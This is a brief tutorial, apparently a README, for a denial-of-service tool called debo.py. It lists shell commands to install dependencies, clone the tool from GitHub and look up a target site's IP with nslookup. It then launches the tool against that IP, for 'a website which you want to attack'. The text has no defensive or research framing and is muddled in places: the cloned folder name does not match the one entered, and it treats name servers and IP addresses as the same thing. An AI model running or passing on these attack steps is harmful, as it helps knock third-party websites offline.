$ apt update<br>
$ apt upgrade<br>
$ apt install python<br>
$ apt install git<br>
$ apt install dnsutils<br>
$ git clone https://github.com/abdelfatah-kfs/DD-Tool-v1.0.git
debo need the 
<b>Name Server</b>
of a website which you want to attack...<br>
To get the Name Server...just type<br>
$ <b>nslookup example.com<b><br>
Note the IP Address of that Website<br>

then <br>
$ cd debo<br>
$ python debo.py -s [ip Address] -t 135<br>
example:<br>
$ python debo.py -s 123.45.67.89 -t 135<br>

